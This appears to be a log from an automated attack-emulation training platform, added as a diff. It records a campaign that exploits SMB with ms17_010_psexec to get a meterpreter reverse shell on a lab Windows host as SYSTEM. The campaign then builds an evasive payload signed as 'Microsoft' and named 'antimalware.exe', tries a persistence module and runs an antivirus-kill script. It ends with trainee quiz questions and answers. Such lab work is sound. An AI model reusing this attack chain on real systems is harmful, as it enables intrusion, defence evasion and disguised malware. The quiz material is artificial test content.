@@ -1,0 +1,81 @@
+2020-03-31 01:06:02,717- attack-thread - INFO - ....................Parsing the Campaign....................
+2020-03-31 01:06:02,723- attack-thread - INFO - [{'TA01_T1190_P1': {'name': 'ms17_010_psexec', 'tactic': 'Initial_Access', 'try_count': 4, 'tool': 'metasploit', 'exploit': 'windows/smb/ms17_010_psexec', 'payload': 'windows/meterpreter/reverse_tcp', 'options': {'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref', 'RHOSTS': 'RHOSTS_$ref'}}}, {'TA24_T1345_P1': {'name': 'payload generation', 'tactic': 'Build_Capabilities', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'phantom-evasion', 'command-prefix': 'python3', 'folder-path': '/home/Tools/Phantom-Evasion/', 'absolute-path': '/home/Tools/Phantom-Evasion/phantom-evasion.py', 'input': [{'Please insert option': '1'}, {'Please insert option': '2'}, {'Please insert option': '2'}, {'Please insert payload number': '3'}, {'Press Enter to continue': ''}, {'Please insert LHOST': 'LHOST_$ref'}, {'Please insert LPORT': 'LPORT_$ref'}, {'Please insert output filename': 'OUTPUT_FILENAME_$ref'}, {'Add multiple processes behaviour': 'n'}, {'Strip executable\\?': 'y'}, {'Sign executable\\?': 'y'}, {'use already existing certificate': 'y'}, {'Select a Certificate': '1'}, {'Insert sign software description': 'Microsoft'}, {'Press Enter to continue': ''}, {'Please insert option': '0'}], 'options': {'LHOST_$ref': 'LHOST_$ref', 'LPORT_$ref': 'LPORT_$ref', 'OUTPUT_FILENAME_$ref': 'OUTPUT_FILENAME_$ref'}}}, {'TA03_T1060_P1': {'name': 'persistence_exe', 'tactic': 'Persistence', 'try_count': 1, 'tool': 'metasploit', 'post': 'windows/manage/persistence_exe', 'options': {'REXENAME': 'REXENAME_$ref', 'REXEPATH': 'REXEPATH_$ref', 'STARTUP': 'SYSTEM', 'SESSION': 'SESSION_$ref'}}}, {'TA05_T1089_P2': {'name': 'killav', 'tactic': 'Defense_Evasion', 'try_count': 4, 'tool': 'meterpreter', 'type': 'script', 'script': 'post/windows/manage/killav'}}]
+2020-03-31 01:06:02,724- attack-thread - INFO - *****************************Check tools status*****************************
+2020-03-31 01:06:02,724- attack-thread - INFO - ['metasploit', 'phantom-evasion', 'metasploit', 'meterpreter']
+2020-03-31 01:06:02,725- attack-thread - INFO - msfconsole = [32mTrue[0m
+2020-03-31 01:06:02,726- attack-thread - INFO - /home/Tools/Phantom-Evasion/phantom-evasion.py = [32mTrue[0m
+2020-03-31 01:06:02,727- attack-thread - INFO - msfconsole = [32mTrue[0m
+2020-03-31 01:06:02,727- attack-thread - INFO - meterpreter = [33mDEPENDS_ON_METASPLOIT[0m
+2020-03-31 01:06:02,749- attack-thread - INFO - No Exceptions Found
+2020-03-31 01:06:02,852- attack-thread - INFO - post not needed
+2020-03-31 01:06:02,870- attack-thread - INFO - exploit['LHOST'] not needed...
+2020-03-31 01:06:02,871- attack-thread - INFO - exploit['LPORT'] not needed...
+2020-03-31 01:06:02,871- attack-thread - INFO - option not found in payloads
+2020-03-31 01:06:02,930- attack-thread - INFO - cid: 19
+2020-03-31 01:06:02,931- attack-thread - INFO - ....................Executing Exploit......................................
+2020-03-31 01:06:03,955- attack-thread - INFO - {'job_id': 32, 'uuid': 'qmjwnrs6'}
+2020-03-31 01:06:03,961- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 01:06:06,987- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 01:06:10,003- attack-thread - INFO - Meterpreter Sessions {'19': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:20483', 'tunnel_peer': '192.168.18.53:55114', 'via_exploit': 'exploit/windows/smb/ms17_010_psexec', 'via_payload': 'payload/windows/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': '', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 445, 'target_host': '192.168.18.53', 'username': 'root', 'uuid': 'ovakxfff', 'exploit_uuid': 'qmjwnrs6', 'routes': '', 'arch': 'x86', 'platform': 'windows'}}
+2020-03-31 01:06:10,006- attack-thread - INFO - Meterpreter Session found in list!, with ID = 19
+2020-03-31 01:06:10,006- attack-thread - INFO - ....................Meterpreter Session List...............................
+2020-03-31 01:06:10,009- attack-thread - INFO - {'19': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:20483', 'tunnel_peer': '192.168.18.53:55114', 'via_exploit': 'exploit/windows/smb/ms17_010_psexec', 'via_payload': 'payload/windows/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': '', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 445, 'target_host': '192.168.18.53', 'username': 'root', 'uuid': 'ovakxfff', 'exploit_uuid': 'qmjwnrs6', 'routes': '', 'arch': 'x86', 'platform': 'windows'}}
+2020-03-31 01:06:10,009- attack-thread - INFO - ....................Connected Meterpreter Session Id: 19....................
+2020-03-31 01:06:10,014- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 01:06:10,015- attack-thread - INFO - Appending Generalize questions_answers
+2020-03-31 01:06:10,015- attack-thread - INFO - Appending scenario-specific questions_answers
+2020-03-31 01:06:10,015- attack-thread - INFO - *****************************Questions*****************************
+2020-03-31 01:06:10,015- attack-thread - INFO - {'General_question_1': {' What is Ip address of Attacker?': 'LHOST_$ref'}, 'General_question_4': {" Write Attacker's port of listening?": 'LPORT_$ref'}, 'Question_1': {' Which Payload type is being used? For Example: Reverse_tcp': 'windows/x64/meterpreter/reverse_tcp'}, 'Question_2': {" Which port is responsible for Attacker's entrance?": '80'}, 'Question_3': {' Which Port is responsible for backdoor connection?': '8778'}, 'Question_4': {' What is time of running payload?  ': '11:09'}, 'Question_5': {' Which Type of attack it is?   ': 'RCD'}, 'Question_6': {'What is the source of coming of  malicious software?  ': 'Application'}, 'Question_7': {'Is it Escalate its priviledge? ': 'Yes'}, 'Question_8': {'Is it Persistence? ': 'No'}}
+2020-03-31 01:06:10,015- attack-thread - INFO - *****************************Actual Answers*****************************
+2020-03-31 01:06:10,015- attack-thread - INFO - ['192.168.18.61', 20483, 'windows/x64/meterpreter/reverse_tcp', '80', '8778', '11:09', 'RCD', 'Application', 'Yes', 'No']
+2020-03-31 01:06:10,037- attack-thread - INFO - evaluation id:5e8251c7e52c551b60c4b9ee
+2020-03-31 01:06:10,037- attack-thread - INFO - ************************Updating Evaluation form for user**********************
+2020-03-31 01:06:10,055- attack-thread - INFO - TA01_T1190_P1 has been appended in evaluation
+2020-03-31 01:06:10,056- attack-thread - INFO - ******[Scenario-ID: TA01_T1190_P1Tactic: Initial_Access executed]******
+2020-03-31 01:06:10,076- attack-thread - INFO - ....................Spawning Phantom Evasion....................
+2020-03-31 01:06:10,076- attack-thread - INFO - Reason: payload generation
+2020-03-31 01:06:20,595- attack-thread - INFO - Please insert option: 1
+2020-03-31 01:06:21,253- attack-thread - INFO - Please insert option: 2
+2020-03-31 01:06:21,810- attack-thread - INFO - Please insert option: 2
+2020-03-31 01:06:23,371- attack-thread - INFO - Please insert payload number: 3
+2020-03-31 01:06:23,528- attack-thread - INFO - Press Enter to continue: 
+2020-03-31 01:06:23,685- attack-thread - INFO - Please insert LHOST: 192.168.18.61
+2020-03-31 01:06:23,737- attack-thread - INFO - Please insert LPORT: 46305
+2020-03-31 01:06:23,790- attack-thread - INFO - Please insert output filename: None
+2020-03-31 01:06:24,342- attack-thread - INFO - Add multiple processes behaviour: n
+2020-03-31 01:06:25,645- attack-thread - INFO - Strip executable\?: y
+2020-03-31 01:06:27,204- attack-thread - INFO - Sign executable\?: y
+2020-03-31 01:06:27,256- attack-thread - INFO - use already existing certificate: y
+2020-03-31 01:06:27,311- attack-thread - INFO - Select a Certificate: 1
+2020-03-31 01:06:27,362- attack-thread - INFO - Insert sign software description: Microsoft
+2020-03-31 01:06:28,652- attack-thread - INFO - Press Enter to continue: 
+2020-03-31 01:06:29,110- attack-thread - INFO - Please insert option: 0
+2020-03-31 01:06:29,111- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 01:06:29,112- attack-thread - WARNING - Mitre/Challenges/Build_Capabilities.json  not found
+2020-03-31 01:06:29,113- attack-thread - INFO - ******[Scenario-ID: TA24_T1345_P1Tactic: Build_Capabilities executed]******
+2020-03-31 01:06:29,136- attack-thread - INFO - ....................Executing Meterpreter Command...............................
+2020-03-31 01:06:30,164- attack-thread - INFO - [*] Backgrounding session 19...
+
+2020-03-31 01:06:30,170- attack-thread - INFO - exploit not needed
+2020-03-31 01:06:30,179- attack-thread - INFO - payload not needed
+2020-03-31 01:06:30,179- attack-thread - INFO - option not found in payloads
+2020-03-31 01:06:30,179- attack-thread - INFO - option not found in payloads
+2020-03-31 01:06:30,179- attack-thread - INFO - option not found in payloads
+2020-03-31 01:06:30,179- attack-thread - INFO - option not found in payloads
+2020-03-31 01:06:30,214- attack-thread - INFO - cid: 20
+2020-03-31 01:06:30,214- attack-thread - INFO - ....................Executing Exploit......................................
+2020-03-31 01:06:30,219- attack-thread - INFO - {'error': True, 'error_class': 'Msf::OptionValidateError', 'error_string': 'The following options failed to validate: REXEPATH.', 'error_backtrace': ["lib/msf/base/simple/post.rb:51:in `run_simple'", "lib/msf/core/rpc/v10/rpc_module.rb:778:in `_run_post'", "lib/msf/core/rpc/v10/rpc_module.rb:495:in `rpc_execute'", "lib/msf/core/rpc/v10/service.rb:153:in `block in process'", "lib/ruby/2.5.0/timeout.rb:93:in `block in timeout'", "lib/ruby/2.5.0/timeout.rb:33:in `block in catch'", "lib/ruby/2.5.0/timeout.rb:33:in `catch'", "lib/ruby/2.5.0/timeout.rb:33:in `catch'", "lib/ruby/2.5.0/timeout.rb:108:in `timeout'", "lib/msf/core/rpc/v10/service.rb:153:in `process'", "lib/msf/core/rpc/v10/service.rb:91:in `on_request_uri'", "lib/msf/core/rpc/v10/service.rb:72:in `block in start'", "lib/rex/proto/http/handler/proc.rb:38:in `on_request'", "lib/rex/proto/http/server.rb:368:in `dispatch_request'", "lib/rex/proto/http/server.rb:302:in `on_client_data'", "lib/rex/proto/http/server.rb:161:in `block in start'", "lib/rex/io/stream_server.rb:48:in `on_client_data'", "lib/rex/io/stream_server.rb:199:in `block in monitor_clients'", "lib/rex/io/stream_server.rb:197:in `each'", "lib/rex/io/stream_server.rb:197:in `monitor_clients'", "lib/rex/io/stream_server.rb:73:in `block in start'", "lib/rex/thread_factory.rb:22:in `block in spawn'", "lib/msf/core/thread_manager.rb:106:in `block in spawn'"], 'error_message': 'The following options failed to validate: REXEPATH.'}
+2020-03-31 01:06:30,228- attack-thread - INFO - Meterpreter Sessions {'19': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:20483', 'tunnel_peer': '192.168.18.53:55114', 'via_exploit': 'exploit/windows/smb/ms17_010_psexec', 'via_payload': 'payload/windows/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': 'NT AUTHORITY\\SYSTEM @ DESKTOP-VTL34JG', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 445, 'target_host': '192.168.18.53', 'username': 'root', 'uuid': 'ovakxfff', 'exploit_uuid': 'qmjwnrs6', 'routes': '', 'arch': 'x86', 'platform': 'windows'}}
+2020-03-31 01:06:30,232- attack-thread - CRITICAL - Exception Occured somewhere!!
+2020-03-31 01:06:30,233- attack-thread - INFO - ....................Going 1 step back........................
+2020-03-31 01:06:30,357- attack-thread - INFO - ....................Spawning Phantom Evasion....................
+2020-03-31 01:06:30,358- attack-thread - INFO - Reason: payload generation
+2020-03-31 01:06:30,359- attack-thread - INFO - ['LPORT'] option not needed...
+2020-03-31 01:06:40,866- attack-thread - INFO - Please insert option: 1
+2020-03-31 01:06:41,524- attack-thread - INFO - Please insert option: 2
+2020-03-31 01:06:42,082- attack-thread - INFO - Please insert option: 2
+2020-03-31 01:06:43,643- attack-thread - INFO - Please insert payload number: 3
+2020-03-31 01:06:43,799- attack-thread - INFO - Press Enter to continue: 
+2020-03-31 01:06:43,956- attack-thread - INFO - Please insert LHOST: 192.168.18.61
+2020-03-31 01:06:44,007- attack-thread - INFO - Please insert LPORT: 46305
+2020-03-31 01:06:44,058- attack-thread - INFO - Please insert output filename: antimalware.exe
